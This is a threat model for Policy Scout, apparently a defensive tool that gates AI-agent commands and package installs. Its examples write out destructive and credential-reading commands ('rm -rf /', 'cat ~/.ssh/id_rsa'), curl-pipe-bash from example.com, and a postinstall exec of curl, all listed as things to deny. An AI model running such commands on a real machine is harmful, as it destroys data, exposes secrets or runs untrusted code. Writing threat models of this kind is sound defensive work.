# Policy Scout — Threat Model

## 1. Purpose

This document defines the initial threat model for Policy Scout.

Policy Scout is a local-first safety harness for agent commands, package installs, and suspicious project activity.

The threat model focuses on practical risks in AI-assisted development:

- unsafe agent-requested commands
- risky dependency installs
- package lifecycle script execution
- suspicious project mutations
- credential-adjacent behavior
- supply-chain malware traces
- unclear or unaudited human approvals

Policy Scout is not a full antivirus, EDR, or kernel-level sandbox. It is a policy-centered safety boundary for local development workflows.

---

## 2. Core Security Boundary

Policy Scout sits between an actor and execution.

```text
Actor -> Request -> Policy Scout -> Decision -> Executor/Sandbox/Denial
```

Actors may include:

- human developers
- AI coding agents
- IDE assistants
- CLI wrappers
- CI jobs
- future MCP-style tool callers
- unknown local processes

Policy Scout assumes actors may be mistaken, overconfident, compromised, poorly prompted, or insufficiently aware of local machine risk.

The actor is not the authority.

The policy engine is the authority.

---

## 3. Assets to Protect

Policy Scout should help protect:

### 3.1 Credentials and Secrets

Examples:

- `.env`
- `.npmrc`
- SSH keys
- API keys
- GitHub tokens
- cloud provider credentials
- package registry tokens
- local config files containing secrets

### 3.2 Project Integrity

Examples:

- source code
- package manifests
- lockfiles
- build scripts
- test scripts
- CI workflows
- generated files
- project configuration

### 3.3 Developer Environment Integrity

Examples:

- shell profiles
- user-level package manager config
- installed global tools
- local services
- startup tasks
- user crontab
- systemd user services

### 3.4 User Trust and Attention

Policy Scout should avoid panic, false certainty, noisy prompts, and vague warnings.

The user should understand:

- what happened
- why it mattered
- what was allowed or blocked
- what was not verified
- what they should do next

### 3.5 Auditability

Policy Scout should preserve durable evidence of important decisions.

Audit records help users understand:

- what was requested
- who requested it
- what Policy Scout decided
- why the decision was made
- what was executed
- what findings were produced

---

## 4. In-Scope Threats

### 4.1 Unsafe Agent Commands

An AI agent may request a dangerous command.

Examples:

```bash
rm -rf /
rm -rf ~/.config
chmod -R 777 .
cat ~/.ssh/id_rsa
```

Policy Scout should classify, deny, require approval, or alert based on risk.

---

### 4.2 Risky Package Installs

Package installs may execute third-party code or mutate project files.

Examples:

```bash
npm install unknown-package
pnpm add suspicious-lib
yarn add package
bun add package
```

Risks:

- lifecycle scripts
- dependency confusion
- typosquatting
- malicious transitive dependencies
- lockfile mutation
- credential exposure during install
- native build steps

Policy Scout should route risky installs to sandbox-first behavior where possible.

---

### 4.3 Package Execution

Package execution tools may download and run code.

Examples:

```bash
npx unknown-tool
pnpm dlx random-cli
bunx tool
```

Policy Scout should treat package execution as high-risk when the tool is unknown or remote-sourced.

---

### 4.4 Network-Fetched Shell Execution

Piping network content into a shell is high risk.

Examples:

```bash
curl https://example.com/install.sh | bash
wget -O- https://example.com/script.sh | sh
```

Policy Scout should deny these by default.

---

### 4.5 Suspicious Lifecycle Scripts

Package lifecycle scripts may execute arbitrary commands.

Examples in `package.json`:

```json
{
  "scripts": {
    "postinstall": "node install.js"
  }
}
```

Suspicious indicators:

- child process execution
- shell execution
- network fetch
- obfuscated JavaScript
- credential file access
- environment variable harvesting
- persistence attempts

---

### 4.6 Workflow Injection

CI workflows can be modified to steal secrets or execute unexpected code.

Examples:

- `.github/workflows/*.yml`
- GitLab CI files
- other automation configs

Policy Scout should flag suspicious workflow changes during sweeps.

---

### 4.7 Credential-Adjacent Access

Commands or scripts may access credential-adjacent files.

Examples:

```bash
cat .env
cat ~/.npmrc
cat ~/.ssh/id_rsa
grep -r "TOKEN" .
```

Policy Scout should treat credential-adjacent behavior as high risk.

---

### 4.8 Persistence Mechanisms

Malware may attempt to persist.

Examples:

- shell profile modification
- crontab modification
- systemd user service creation
- startup script creation
- package manager config modification

Policy Scout v0.1 should detect obvious project and user-level persistence indicators where feasible.

---

### 4.9 Suspicious Processes and Open Ports

Supply-chain malware may spawn unexpected processes or open ports.

Policy Scout quick system sweep should look for:

- unexpected Node/Bun/Python processes
- listening ports
- suspicious process command lines
- recent temp files

Platform differences matter. Findings should be cautious and evidence-based.

---

### 4.10 Audit Gaps

A dangerous workflow may happen because no one remembers what was approved or executed.

Policy Scout should log:

- requests
- classifications
- policy hits
- decisions
- approvals
- execution results
- sandbox results
- findings
- Scout Reports

---

## 5. Out-of-Scope Threats for v0.1

Policy Scout v0.1 does not attempt to solve:

- kernel-level malware
- rootkits
- complete endpoint detection
- memory forensics
- full antivirus scanning
- network packet inspection
- browser exploit detection
- cloud account compromise detection
- automatic credential rotation
- automatic incident remediation
- complete malware attribution
- enterprise multi-user policy enforcement
- guaranteed detection of all supply-chain malware

Policy Scout may provide guidance for these situations, but should not claim complete detection or remediation.

---

## 6. Trust Assumptions

Policy Scout assumes:

1. The local user controls the machine.
2. Policy Scout can run with normal user permissions.
3. Policy Scout is not itself compromised.
4. The user can review and approve prompts.
5. The filesystem and process information available to Policy Scout may be incomplete.
6. Package metadata and remote registries may be untrusted.
7. AI agents may be useful but should not be trusted with unrestricted execution.
8. LLM-generated explanations may be helpful but must not override deterministic policy.

---

## 7. Attacker Goals

Possible attacker goals:

- steal credentials
- execute arbitrary code
- persist in the developer environment
- modify project source
- inject CI workflows
- publish malicious packages
- exfiltrate files
- poison dependencies
- hide suspicious changes
- trick the user into approving unsafe commands
- exploit over-permissive agent tooling

---

## 8. Threat Scenarios

### Scenario 1: Agent Suggests Dangerous Install

An agent requests:

```bash
npm install unknown-helper
```

Policy Scout should:

1. classify as package install
2. detect network/package/lifecycle risk
3. route to sandbox first
4. inspect lifecycle scripts
5. produce a Scout Report
6. ask before migration

---

### Scenario 2: Agent Requests Curl Pipe Bash

An agent requests:

```bash
curl https://example.com/install.sh | bash
```

Policy Scout should:

1. detect network-fetched shell execution
2. classify as `network_execute`
3. return `DENY`
4. explain why
5. suggest safer manual inspection

---

### Scenario 3: Suspicious Postinstall Script

Sandbox install reveals:

```json
{
  "scripts": {
    "postinstall": "node ./scripts/install.js"
  }
}
```

The script contains:

```javascript
require("child_process").exec("curl ...")
```

Policy Scout should:

1. create a finding
2. mark severity and confidence
3. include evidence location
4. avoid printing secrets
5. recommend review or denial
6. prevent automatic migration

---

### Scenario 4: Credential-Adjacent Access

An agent requests:

```bash
cat ~/.ssh/id_rsa
```

Policy Scout should:

1. classify as credential-adjacent
2. return `DENY_AND_ALERT`
3. write audit event
4. explain that credential material should not be exposed to agents

---

### Scenario 5: Unknown Complex Shell Command

An actor requests a complex command with subshells and redirects.

Policy Scout should:

1. parse as much as possible
2. preserve uncertainty
3. increase risk due to parser uncertainty
4. require approval or deny depending on capabilities

---

## 9. Security Controls

Initial controls:

- command classification
- capability detection
- policy-based decisions
- approval queue
- sandbox-first package installs
- lifecycle script inspection
- project sweep
- system quick sweep
- audit events
- Scout Reports
- secret redaction
- fail-safe behavior

---

## 10. Fail-Safe Requirements

Policy Scout should fail safe when:

- command parsing fails
- registry validation fails
- policy engine fails
- audit logging fails for risky commands
- sandbox execution fails
- sweep cannot verify important areas
- classifier confidence is too low

Fail-safe does not always mean deny. It may mean require approval. But for high-risk or unknown execution, fail-safe should be conservative.

---

## 11. Reporting Requirements

Scout Reports should include:

- risk level
- decision
- evidence
- uncertainty
- what was checked
- what was not checked
- recommended next action
- possible credential exposure
- audit event IDs

Reports should not overclaim.

Use:

```text
possible credential exposure
suspicious finding
review recommended
could not verify
```

Avoid unsupported claims like:

```text
you are infected
malware confirmed
credentials definitely stolen
```

unless there is a confirmed indicator.

---

## 12. Threat Model Doctrine

Policy Scout exists because agentic development expands the execution surface.

The safest design is not to trust the agent less emotionally. It is to give every actor the same structured boundary:

```text
request -> classify -> score -> decide -> execute/sandbox/deny -> audit/report
```

Policy Scout should protect the developer without pretending to be a full security platform.
